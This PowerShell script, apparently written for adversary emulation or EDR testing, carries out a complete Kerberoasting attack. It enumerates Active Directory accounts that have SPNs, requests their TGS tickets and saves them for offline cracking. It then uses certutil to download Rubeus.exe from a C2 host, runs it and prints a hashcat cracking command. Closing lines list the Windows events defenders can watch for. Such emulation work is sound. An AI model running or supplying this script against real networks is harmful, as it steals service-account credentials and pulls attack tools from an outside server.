$ErrorActionPreference = "SilentlyContinue"
$C2Host = if ($env:C2_HOST) { $env:C2_HOST } else { "127.0.0.1" }

Write-Host "[*] Starting Identity Attack - Kerberoasting..." -ForegroundColor Cyan

# T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting
# Requests TGS tickets for accounts with SPNs then exports for offline cracking
# Requires: Any domain user (no elevated privileges needed)

Write-Host "[!] Requires: Any authenticated domain user" -ForegroundColor Yellow

$stagingDir = "C:\temp\staging"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null

# Step 1: Enumerate SPNs using native LDAP
Write-Host "`n[*] [T1087.002] Enumerating accounts with Service Principal Names (SPNs)..." -ForegroundColor Yellow
Write-Host "    CMD: setspn -T <domain> -Q */*"

try {
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $domainDN = "DC=" + ($domain.Name -replace "\.", ",DC=")
    Write-Host "[+] Domain: $($domain.Name)" -ForegroundColor Green

    # LDAP query for user accounts with SPNs (filter out computer accounts)
    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domainDN")
    $searcher.Filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
    $searcher.PropertiesToLoad.AddRange(@("samaccountname", "serviceprincipalname", "memberof", "pwdlastset"))
    $results = $searcher.FindAll()

    Write-Host "[+] Found $($results.Count) accounts with SPNs:" -ForegroundColor Green
    foreach ($result in $results) {
        $sam = $result.Properties["samaccountname"][0]
        $spns = $result.Properties["serviceprincipalname"]
        $pwdSet = [DateTime]::FromFileTime([Int64]$result.Properties["pwdlastset"][0])
        Write-Host "    [SPN] $sam (Password set: $pwdSet)" -ForegroundColor Cyan
        foreach ($spn in $spns) {
            Write-Host "          -> $spn" -ForegroundColor Gray
        }
    }
} catch {
    Write-Host "[-] LDAP SPN enumeration failed: $_" -ForegroundColor Red
    Write-Host "[*] Falling back to setspn..." -ForegroundColor Yellow
    setspn -T * -Q */* 2>&1
}

# Step 2: Request TGS tickets using .NET (native method)
Write-Host "`n[*] [T1558.003] Requesting TGS tickets for SPN accounts..." -ForegroundColor Yellow
Write-Host "    Using System.IdentityModel.Tokens.KerberosRequestorSecurityToken"

Add-Type -AssemblyName System.IdentityModel

$ticketOutput = "$stagingDir\kerberoast_tickets.txt"
$hashOutput = "$stagingDir\kerberoast_hashes.txt"
$ticketCount = 0

try {
    foreach ($result in $results) {
        $spns = $result.Properties["serviceprincipalname"]
        $sam = $result.Properties["samaccountname"][0]
        foreach ($spn in $spns) {
            Write-Host "    [*] Requesting TGS for: $spn" -ForegroundColor Yellow
            try {
                $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
                $ticketBytes = $ticket.GetRequest()
                $ticketCount++

                # Extract the encrypted part for hashcat/john format
                $hexTicket = [System.BitConverter]::ToString($ticketBytes) -replace '-', ''
                "$sam : $spn : $hexTicket" | Out-File -Append -FilePath $ticketOutput

                Write-Host "    [+] TGS ticket obtained for $spn" -ForegroundColor Green
            } catch {
                Write-Host "    [-] Failed to request TGS for $spn : $_" -ForegroundColor Red
            }
        }
    }
    Write-Host "`n[+] Captured $ticketCount TGS tickets" -ForegroundColor Green
} catch {
    Write-Host "[-] .NET Kerberos ticket request failed: $_" -ForegroundColor Red
}

# Step 3: Export tickets from memory using klist
Write-Host "`n[*] Listing cached Kerberos tickets..." -ForegroundColor Yellow
Write-Host "    CMD: klist"
klist 2>&1

# Step 4: Try Rubeus from C2 as fallback
Write-Host "`n[*] [T1105] Attempting Rubeus download for enhanced Kerberoasting..." -ForegroundColor Yellow
$rubeusPath = "$stagingDir\Rubeus.exe"
Write-Host "    CMD: certutil -urlcache -split -f http://$C2Host/tools/Rubeus.exe $rubeusPath"
certutil -urlcache -split -f "http://$C2Host/tools/Rubeus.exe" $rubeusPath

if (Test-Path $rubeusPath) {
    Write-Host "[+] Rubeus downloaded successfully" -ForegroundColor Green

    Write-Host "`n[*] [T1558.003] Running Rubeus kerberoast..." -ForegroundColor Yellow
    Write-Host "    CMD: Rubeus.exe kerberoast /outfile:$hashOutput"
    & $rubeusPath kerberoast /outfile:$hashOutput 2>&1

    if (Test-Path $hashOutput) {
        $hashCount = (Get-Content $hashOutput | Measure-Object).Count
        Write-Host "[+] Kerberoast hashes saved: $hashOutput ($hashCount lines)" -ForegroundColor Green
        Write-Host "[!] Crack with: hashcat -m 13100 $hashOutput wordlist.txt" -ForegroundColor Yellow
    }
} else {
    Write-Host "[*] Rubeus not available - using native .NET method only" -ForegroundColor Yellow
}

Write-Host "`n[+] Kerberoasting Attack Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: TGS requests (4769), Kerberos encryption downgrade, Rubeus execution" -ForegroundColor Yellow
Write-Host "[!] Key Event ID: 4769 (Kerberos Service Ticket Requested) with RC4 encryption (0x17)" -ForegroundColor Yellow
